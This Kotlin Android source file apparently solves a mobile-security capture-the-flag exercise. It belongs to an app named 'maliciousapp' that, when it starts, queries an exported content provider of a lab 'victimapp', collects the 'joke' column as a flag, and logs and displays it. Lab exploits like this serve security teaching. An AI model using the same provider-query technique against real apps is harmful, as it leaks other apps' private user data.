package com.example.maliciousapp

import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.TextView

import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    private val TAG = "MOBIOTSEC"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
    }

    override fun onStart() {
        super.onStart()
        contentResolver.query(
            Uri.parse("content://com.example.victimapp.MyProvider/joke"),
            arrayOf("author", "joke"),
            "author = 'elosiouk'",
            null,
            null,
        )?.apply {
            val colIndex = getColumnIndex("joke")
            var flag = ""
            while (moveToNext()) {
                flag += getString(colIndex)
            }
            Log.d(TAG, "The flag is $flag")
            findViewById<TextView>(R.id.debug_text).text = flag
        }
    }
}
